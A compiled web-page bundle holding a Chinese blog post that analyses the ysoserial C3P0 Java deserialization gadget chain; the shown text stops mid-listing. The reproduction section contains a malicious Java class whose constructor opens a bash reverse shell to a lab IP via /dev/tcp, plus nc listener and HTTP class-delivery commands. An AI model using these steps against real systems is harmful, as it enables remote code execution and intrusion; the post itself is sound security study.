import{_ as s,o as a,c as l,V as n}from"./chunks/framework.e326ebab.js";const e="/images/image-20210805153009076.png",o="/images/image-20210805153915476.png",p="/images/image-20210805154324070.png",m=JSON.parse('{"title":"反序列化漏洞-ysoserial-C3P0","description":"C3P0是一个开源的JDBC连接池，它实现了数据源与JNDI绑定，支持JDBC3规范以及JDBC2的标准扩展。本例中演示了基于该工程下的PoolBackedDataSourceBase的反序列化漏洞，通过该漏洞可以实现远程代码执行。","frontmatter":{"description":"C3P0是一个开源的JDBC连接池，它实现了数据源与JNDI绑定，支持JDBC3规范以及JDBC2的标准扩展。本例中演示了基于该工程下的PoolBackedDataSourceBase的反序列化漏洞，通过该漏洞可以实现远程代码执行。","create_date":"2021-08-02T00:00:00.000Z"},"headers":[],"relativePath":"posts/cybersecurity/反序列化漏洞-ysoserial-C3P0.md","filePath":"posts/cybersecurity/反序列化漏洞-ysoserial-C3P0.md","lastUpdated":1689313191000}'),t={name:"posts/cybersecurity/反序列化漏洞-ysoserial-C3P0.md"},c=n(`<h1 id="反序列化漏洞-ysoserial-c3p0" tabindex="-1">反序列化漏洞-ysoserial-C3P0 <a class="header-anchor" href="#反序列化漏洞-ysoserial-c3p0" aria-label="Permalink to &quot;反序列化漏洞-ysoserial-C3P0&quot;">​</a></h1><h2 id="背景知识" tabindex="-1">背景知识 <a class="header-anchor" href="#背景知识" aria-label="Permalink to &quot;背景知识&quot;">​</a></h2><ol><li><p><em>ysoserial</em>包含了许多针对通用Java依赖包的小工具链，可以在正常情况下通过使目标程序进行不安全的反序列化实现攻击利用。</p></li><li><p>Gadgets</p><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;">/*</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> * PoolBackedDataSourceBase.readObject()</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *		IndirectlySerialized/ReferenceSerialized.getObject()</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *			ReferenceableUtils.referenceToObject( Reference ref, Name name, Context nameCtx, Hashtable env)</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *				Class.forName(String name, boolean initialize, ClassLoader loader)</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *				ObjectFactory.newInstance()</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *					invoke malicious Constructor of Attacker&#39;s malicious class</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> */</span></span></code></pre></div></li><li><p>Java序列化</p><ul><li>Java原生序列化和反序列化将属性的类名同时写入到了序列化流中</li><li>Java反序列化时会调用ObjectInputStream的readObject()方法来进行反序列化</li><li>无论反序列化是否成功，只要读取到类名就会加载这个类，如果该类有自定义的readObjec()就执行自定义的readObject()方法，如果没有就按照默认的readObject()流程执行，因此只要readObject()存在调用点，无论业务代码中是否使用了这些类，都会执行readObject()过程从而执行恶意代码</li></ul></li><li><p>C3P0</p><ul><li>C3P0是一个开源的JDBC连接池，它实现了数据源与JNDI的绑定，支持JDBC3规范和JDBC2的标准扩展，使用它的开源项目有Hibernate、Spring。</li><li><a href="https://github.com/MonkeyDatabase/LearningJDBC/blob/main/src/io/github/monkeydatabase/jdbc/Statement_WithSQLInjection.java" target="_blank" rel="noreferrer">传统JDBC开发模式</a><ul><li>注册驱动</li><li>获取连接Connection</li><li>获取数据库处理对象Statement</li><li>执行SQL语句</li><li>处理查询结果集ResultSet</li><li>释放资源</li></ul></li><li>为解决传统开发模式中“一旦需要数据库连接就必须向数据库重新认证申请连接，执行完成后再断开连接”带来的时间开销，采用数据库连接池技术来进行缓解。 <ul><li>为数据库建立一个缓冲池，在缓冲池中创建指定数量的数据库连接</li><li>每当有连接请求时，从缓冲池中取出处于“空闲”状态的连接，并将此连接标记为“忙碌”状态，直到该连接请求处理完成后将该连接标记为“空闲状态”等待下次使用</li><li>无论数据库连接池中的连接是否被使用，都会保持最小连接数以应对流量的变化，如果连接数超过当前数据库连接池中的连接数会按照配置的自增长数增加连接直到达到最大连接数</li></ul></li></ul></li></ol><h2 id="验证过程" tabindex="-1">验证过程 <a class="header-anchor" href="#验证过程" aria-label="Permalink to &quot;验证过程&quot;">​</a></h2><ul><li><p>配置环境</p><ul><li><code>com.mchange</code>:<code>c3p0:0.9.5.2</code></li><li><code>com.mchange</code>:<code>mchange-commons-java:0.2.11</code></li><li>jdk1.8(非必须)</li></ul></li><li><p>在12345端口打开监听，等待反弹shell连接，该连接用于获取远程shell</p><div class="language-shell"><button title="Copy Code" class="copy"></button><span class="lang">shell</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#FFCB6B;">nc</span><span style="color:#A6ACCD;"> </span><span style="color:#C3E88D;">-l</span><span style="color:#A6ACCD;"> </span><span style="color:#F78C6C;">12345</span></span></code></pre></div></li><li><p>准备被靶机通过Reference获取的恶意类</p><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">class</span><span style="color:#A6ACCD;"> </span><span style="color:#FFCB6B;">Exploit</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Exploit</span><span style="color:#89DDFF;">(){</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">try</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#C792EA;">Runtime</span><span style="color:#A6ACCD;"> r </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> Runtime</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">getRuntime</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#C792EA;">Process</span><span style="color:#A6ACCD;"> p </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> r</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">exec</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">String</span><span style="color:#89DDFF;">[]{</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">/bin/bash</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">-c</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">bash -i &gt;&amp; /dev/tcp/192.168.59.128/12345 0&gt;&amp;1</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">});</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">}</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">catch</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">Exception</span><span style="color:#A6ACCD;"> </span><span style="color:#A6ACCD;font-style:italic;">e</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">            System</span><span style="color:#89DDFF;">.</span><span style="color:#A6ACCD;">out</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">println</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">e</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span></code></pre></div></li><li><p>将该类编译后放到任意目录，然后在该目录中启动一个HTTP服务等待靶机连接，该连接用于将恶意类返回给靶机</p><div class="language-"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#A6ACCD;">python -m SimpleHTTPServer 9999</span></span></code></pre></div></li><li><p>在IDEA中运行C3P0.java，配置Program 参数为<code>http://ip:port/:classname</code></p><ul><li>ip、port为用于返回恶意类的地址</li><li>classname为返回的恶意类的类名</li><li>将参数在输入给C3P0之后，会以最后一个<code>:</code>拆分为两个参数 <ul><li>url：<code>http://ip:port/</code></li><li>classname:<code>classname</code></li></ul></li></ul><p><img src="`+e+'" alt="image-20210805153009076"></p></li><li><p>运行之后，首先用于返回恶意类的监听会显示一条HTTP请求日志</p><p><img src="'+o+'" alt="image-20210805153915476.png"></p></li><li><p>然后等待反弹shell的监听会捕获到来自靶机的webshell</p><p><img src="'+p+`" alt="image-20210805154324070.png"></p></li></ul><h2 id="攻击原理" tabindex="-1">攻击原理 <a class="header-anchor" href="#攻击原理" aria-label="Permalink to &quot;攻击原理&quot;">​</a></h2><ol><li><p>序列化时，构造Payload过程中首先调用了<code>PoolBackedDataSourceBase.writeObject()</code>，其中有个关键的点，它在序列化<code>connectionPoolDataSource</code>和<code>extensions</code>两个成员属性时，进行了如下操作</p><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#676E95;font-style:italic;">/*</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *	PoolBackedDataSourceBase.writeObject()</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *		SerializableUtils.toByteArray()	测试对象是否可序列化</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> *			ReferenceIndirector.indirectForm() 若不可序列化则将其转化为ReferenceSerialized</span></span>
<span class="line"><span style="color:#676E95;font-style:italic;"> */</span></span></code></pre></div><ul><li>先调用了c3p0自带的一个工具类SerializableUtils的序列化方法，其中声明了一个单独的ObjectOutputStream尝试对该对象进行序列化 <ul><li>若不抛出NotSerializableException异常，则当前对象实现了Serializable接口，可以进行序列化</li><li>若抛出NotSerializableException异常，则当前对象未实现Serializable接口，无法完成序列化，也不对原有的输出流造成影响</li></ul></li><li>如果对象无法序列化，则使用c3p0中定义的<code>Indirector</code>接口及其实现类<code>ReferenceIndirector</code>将实现了<code>Referenceable</code>接口的对象转化为实现了<code>Serializable</code>接口和<code>IndirectlySerialized</code>接口的<code>ReferenceSerialized</code>对象，从而实现对原本无法序列化的对象进行序列化操作</li></ul></li><li><p>C3P0的Payload中构造的<code>connectionPoolDataSource</code>是不可序列化的，它实现了<code>Referenceable</code>接口，其<code>getReference()</code>相关方法如下。</p><ul><li>将提供恶意类的url赋值给了Reference的classFactoryLocation属性</li><li>将恶意类的类名赋值给了Reference的classFactory属性</li><li>将固定字符串&quot;exploit&quot;赋值给了Reference的className属性</li></ul><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">PoolSource</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> className</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> url </span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">className </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> className</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">url </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> url</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Reference</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getReference</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;"> throws NamingException </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">return</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Reference</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">exploit</span><span style="color:#89DDFF;">&quot;</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">className</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">url</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Reference</span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> className</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> factory</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> factoryLocation</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this(</span><span style="color:#A6ACCD;">className</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    classFactory </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> factory</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">    classFactoryLocation </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> factoryLocation</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">Reference</span><span style="color:#89DDFF;">(</span><span style="color:#C792EA;">String</span><span style="color:#A6ACCD;"> className</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">className  </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> className</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">    addrs </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Vector</span><span style="color:#89DDFF;">&lt;&gt;();</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span></code></pre></div></li><li><p>反序列化时，由于Payload最外层为<code>PoolBackedDataSourceBase</code>对象，所以会首先调用以下方法<code>PoolBackedDataSourceBase.readObject()</code>，它按照序列化的顺序依次读取内容，在反序列化<code>connectionPoolDataSource</code>和<code>extensions</code>两个参数时进行了如下操作</p><ul><li><p>反序列化出对象存储到Object类型的对象中</p></li><li><p>检查该object是否实现了<code>IndirectlySerialized</code>接口，因为在序列化时会在这两个属性不可序列化时将其转化为实现了<code>IndirectlySerialized</code>接口的<code>ReferenceSerialized</code>类的实例，因此在调用<code>IndirectlySerialized.getObject()</code>来获取间接实例化的对象的过程中实际调用的是<code>ReferenceSerialized.getObject()</code>。</p><blockquote><p>成功转换为<code>ReferenceSerialized</code>实例的对象一定实现了<code>Referenceable</code>接口，所以通过其中存储的Reference对象可获取到序列化之前的对象。</p></blockquote></li></ul><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">private</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">void</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">readObject</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">ObjectInputStream</span><span style="color:#A6ACCD;"> ois </span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> throws IOException</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> ClassNotFoundException </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#C792EA;">short</span><span style="color:#A6ACCD;"> version </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> ois</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">readShort</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">switch</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">version</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">case</span><span style="color:#A6ACCD;"> VERSION</span><span style="color:#89DDFF;font-style:italic;">:</span></span>
<span class="line"><span style="color:#89DDFF;">            </span><span style="color:#676E95;font-style:italic;">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#C792EA;">Object</span><span style="color:#A6ACCD;"> o </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> ois</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">readObject</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">o </span><span style="color:#89DDFF;">instanceof</span><span style="color:#A6ACCD;"> IndirectlySerialized</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span></span>
<span class="line"><span style="color:#A6ACCD;">                    o </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">((</span><span style="color:#A6ACCD;">IndirectlySerialized</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> o</span><span style="color:#89DDFF;">).</span><span style="color:#82AAFF;">getObject</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">connectionPoolDataSource </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">ConnectionPoolDataSource</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> o</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">dataSourceName </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">String</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> ois</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">readObject</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#89DDFF;">            </span><span style="color:#676E95;font-style:italic;">// we create an artificial scope so that we can use the name o for all indirectly serialized objects.</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#C792EA;">Object</span><span style="color:#A6ACCD;"> o </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> ois</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">readObject</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">o </span><span style="color:#89DDFF;">instanceof</span><span style="color:#A6ACCD;"> IndirectlySerialized</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> o </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">((</span><span style="color:#A6ACCD;">IndirectlySerialized</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> o</span><span style="color:#89DDFF;">).</span><span style="color:#82AAFF;">getObject</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">                </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">extensions </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">Map</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> o</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">factoryClassLocation </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">String</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> ois</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">readObject</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">identityToken </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;">String</span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> ois</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">readObject</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">numHelperThreads </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> ois</span><span style="color:#89DDFF;">.</span><span style="color:#82AAFF;">readInt</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">pcs </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">PropertyChangeSupport</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">this</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">vcs </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">VetoableChangeSupport</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">this</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;font-style:italic;">break</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">default:</span></span>
<span class="line"><span style="color:#A6ACCD;">            </span><span style="color:#89DDFF;font-style:italic;">throw</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">IOException</span><span style="color:#89DDFF;">(</span><span style="color:#89DDFF;">&quot;</span><span style="color:#C3E88D;">Unsupported Serialized Version: </span><span style="color:#89DDFF;">&quot;</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">+</span><span style="color:#A6ACCD;"> version</span><span style="color:#89DDFF;">);</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">}</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span></code></pre></div></li><li><p>接下来看<code>IndirectlySerialized.getObject()</code>，它创建了两个Context，然后调用<code>ReferenceableUtils.referenceToObject()</code>根据Reference获取目标对象</p><div class="language-java"><button title="Copy Code" class="copy"></button><span class="lang">java</span><pre class="shiki material-theme-palenight"><code><span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">ReferenceSerialized</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Reference</span><span style="color:#A6ACCD;"> reference</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Name</span><span style="color:#A6ACCD;"> name</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Name</span><span style="color:#A6ACCD;"> contextName</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Hashtable</span><span style="color:#A6ACCD;"> env </span><span style="color:#89DDFF;">)</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">reference </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> reference</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">name </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> name</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">contextName </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> contextName</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;">this.</span><span style="color:#A6ACCD;">env </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> env</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#89DDFF;">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#C792EA;">public</span><span style="color:#A6ACCD;"> </span><span style="color:#C792EA;">Object</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">getObject</span><span style="color:#89DDFF;">()</span><span style="color:#A6ACCD;"> throws ClassNotFoundException</span><span style="color:#89DDFF;">,</span><span style="color:#A6ACCD;"> IOException </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">    </span><span style="color:#89DDFF;font-style:italic;">try</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">{</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">Context</span><span style="color:#A6ACCD;"> initialContext</span><span style="color:#89DDFF;">;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> env </span><span style="color:#89DDFF;">==</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">null</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">)</span></span>
<span class="line"><span style="color:#A6ACCD;">            initialContext </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">InitialContext</span><span style="color:#89DDFF;">();</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">else</span></span>
<span class="line"><span style="color:#A6ACCD;">            initialContext </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;font-style:italic;">new</span><span style="color:#A6ACCD;"> </span><span style="color:#82AAFF;">InitialContext</span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> env </span><span style="color:#89DDFF;">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#C792EA;">Context</span><span style="color:#A6ACCD;"> nameContext </span><span style="color:#89DDFF;">=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">null;</span></span>
<span class="line"><span style="color:#A6ACCD;">        </span><span style="color:#89DDFF;font-style:italic;">if</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">(</span><span style="color:#A6ACCD;"> contextName </span><span style="color:#89DDFF;">!=</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">null</span><span style="color:#A6ACCD;"> </span><span style="color:#89DDFF;">)</span></span>
